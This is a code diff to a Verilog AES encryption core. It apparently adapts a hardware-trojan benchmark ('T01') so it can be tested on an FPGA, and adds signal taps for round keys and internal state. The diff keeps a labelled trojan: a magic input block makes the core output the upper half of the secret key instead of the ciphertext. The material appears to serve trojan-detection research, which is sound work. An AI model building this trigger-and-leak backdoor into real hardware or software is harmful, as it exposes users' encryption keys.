@@ -38,10 +38,8 @@
 //======================================================================
 
 // AEGIS-AES modification:
-// Doi ten module, su dung key memory tapped va dua round key ra cong.
-// Logic AES goc va BSD 2-Clause license duoc giu nguyen.
-
-`default_nettype none
+// Chuyen benchmark T01 sang giao dien tapped de kiem thu KLG tren FPGA.
+// Trigger va payload cua benchmark duoc giu nguyen.
 
 `default_nettype none
 
@@ -63,7 +61,10 @@ module aes_core_tapped(
                 output wire [1407 : 0] round_keys_flat,
 
                 // RCM: tap round counter
-                output wire [3 : 0]   muxed_round_nr
+                output wire [3 : 0]   muxed_round_nr,
+
+                // ORC: tap state before final round
+                output wire [127 : 0] state_before_final
                );
 
 
@@ -117,6 +118,10 @@ module aes_core_tapped(
   reg            muxed_ready;
 
   wire [31 : 0]  keymem_sboxw;
+  wire [127:0]   enc_state_before_final;
+
+  wire           trojan_trig;
+  wire [127 : 0] result_maybe_evil;
 
 /* verilator lint_off UNOPTFLAT */
   reg [31 : 0]   muxed_sboxw;
@@ -127,7 +132,7 @@ module aes_core_tapped(
   //----------------------------------------------------------------
   // Instantiations.
   //----------------------------------------------------------------
-  aes_encipher_block enc_block(
+  aes_encipher_block_tapped enc_block(
                                .clk(clk),
                                .reset_n(reset_n),
 
@@ -142,7 +147,9 @@ module aes_core_tapped(
 
                                .block(block),
                                .new_block(enc_new_block),
-                               .ready(enc_ready)
+                               .ready(enc_ready),
+
+                               .state_before_final(enc_state_before_final)
                               );
 
 
@@ -186,17 +193,20 @@ module aes_core_tapped(
   //----------------------------------------------------------------
   // Concurrent connectivity for ports etc.
   //----------------------------------------------------------------
-  assign ready        = ready_reg;
+  assign ready              = ready_reg;
+  assign result             = result_maybe_evil;
+  assign result_valid       = result_valid_reg;
+  assign muxed_round_nr    = muxed_round_nr_int;
+  assign state_before_final = enc_state_before_final;
+
   // ====== TROJAN BEGIN: T01_p1_key_dump =====
-  wire trojan_trig = (block ==
-                      128'hDEADBEEF_CAFEBABE_00000000_00000000);
-  wire [127:0] result_maybe_evil = trojan_trig
-                                 ? key[255 : 128]
-                                 : muxed_new_block;
-  assign result = result_maybe_evil;
+  assign trojan_trig = (block ==
+                        128'hDEADBEEF_CAFEBABE_00000000_00000000);
+
+  assign result_maybe_evil = trojan_trig
+                           ? key[255 : 128]
+                           : muxed_new_block;
   // ===== TROJAN END: T01_p1_key_dump =====
-  assign result_valid = result_valid_reg;
-  assign muxed_round_nr = muxed_round_nr_int;
 
 
   //----------------------------------------------------------------
